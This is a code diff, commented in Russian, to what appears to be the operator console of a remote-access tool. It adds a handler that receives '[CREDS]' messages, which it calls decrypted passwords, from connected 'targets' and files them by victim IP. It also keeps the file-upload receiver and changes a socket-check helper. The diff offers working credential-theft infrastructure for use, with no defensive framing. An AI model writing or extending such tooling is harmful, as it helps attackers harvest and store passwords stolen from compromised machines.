@@ -41,25 +41,46 @@ def save_file(filename, data_b64):
 
 def handle_recv(conn):
     """
-    Принимает данные от сервера и выводит их построчно на консоль,
-    раскрашивая строки, начинающиеся с [*] (голубым) и с [+] (зелёным).
-    Также обрабатывается загрузка файлов по протоколу [UPLOAD]::...::END.
+    Принимает данные от сервера и выводит их построчно на консоль.
+    Обрабатывает:
+    - Цветной вывод ([*], [+])
+    - Загрузку файлов ([UPLOAD]::...)
+    - Сохранение расшифрованных паролей ([CREDS]::...)
     """
     import sys
     buffer = ""
     receiving_upload = False
     upload_data = ""
-    
+
     while True:
         try:
             data = conn.recv(4096)
             if not data:
                 print("\n[!] Connection closed by target.")
                 break
-            # Декодируем полученные данные и нормализуем переносы строк:
             chunk = data.decode('utf-8', errors='ignore').replace('\r\n', '\n')
-            
-            # Если идёт передача файла, аккумулируем данные отдельно.
+
+            # Обработка расшифрованных кредов [CREDS]::...::END
+            if chunk.startswith("[CREDS]::"):
+                buffer = chunk
+                while "::END" not in buffer:
+                    more = conn.recv(4096).decode("utf-8", errors="ignore")
+                    buffer += more
+                try:
+                    ip = conn.getpeername()[0]
+                    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                    save_path = os.path.join(DOWNLOAD_DIR, ip, "creds")
+                    os.makedirs(save_path, exist_ok=True)
+                    file_path = os.path.join(save_path, f"{now}_creds.txt")
+                    creds_content = buffer.replace("[CREDS]::", "").replace("::END", "").strip()
+                    with open(file_path, "w", encoding="utf-8") as f:
+                        f.write(creds_content)
+                    print(f"\n[+] Saved credentials to {file_path}")
+                except Exception as e:
+                    print(f"[!] Error saving decrypted creds: {e}")
+                continue
+
+            # Обработка загрузки файла
             if receiving_upload:
                 upload_data += chunk
                 if "::END" in upload_data:
@@ -67,32 +88,26 @@ def handle_recv(conn):
                         parts = upload_data.split("::", 3)
                         filename = parts[1].strip()
                         b64_data = parts[2].strip()
-                        # Функция save_file уже должна сохранять файл на диск
                         save_file(filename, b64_data)
                         print(f"\n[+] File saved: {filename}")
                     except Exception as e:
                         print(f"\n[!] Error decoding upload: {e}")
                     receiving_upload = False
                     upload_data = ""
-                continue  # Ждем следующего порции данных для файла.
-            
-            # Если начинается загрузка файла, переключаем режим
+                continue
+
             if chunk.startswith("[UPLOAD]::"):
                 upload_data = chunk
                 receiving_upload = True
                 continue
-            
-            # Добавляем полученные данные к буферу
+
+            # Обычный вывод с цветами
             buffer += chunk
-            # Выводим построчно
             while "\n" in buffer:
                 line, buffer = buffer.split("\n", 1)
-                # Применяем цвета на стороне клиента
                 if line.startswith("[*]"):
-                    # Голубой (цветовая последовательность Cyan)
                     line = colorama.Fore.CYAN + line + colorama.Style.RESET_ALL
                 elif line.startswith("[+]"):
-                    # Зелёный
                     line = colorama.Fore.GREEN + line + colorama.Style.RESET_ALL
                 print(line)
                 sys.stdout.flush()
@@ -165,19 +180,17 @@ def accept_connections(server_socket):
 
 def is_socket_closed(sock):
     """
-    Возвращает True, если сокет, по крайней мере,
-    предположительно закрыт (не отвечает на peek).
+    Возвращает True, если сокет закрыт.
+    Использует select для проверки состояния.
     """
     try:
-        # Попытка прочитать 1 байт без удаления из буфера
-        data = sock.recv(1, socket.MSG_PEEK)
-        # Если данных нет, сокет мог быть закрыт
-        return len(data) == 0
-    except BlockingIOError:
-        # Если сокет не готов, но не закрыт, вернем False
+        import select
+        rlist, _, _ = select.select([sock], [], [], 0)
+        if rlist:
+            data = sock.recv(1, socket.MSG_PEEK)
+            return len(data) == 0
         return False
     except Exception:
-        # Любая другая ошибка – считаем, что сокет закрыт
         return True
 
 def curses_main(stdscr):
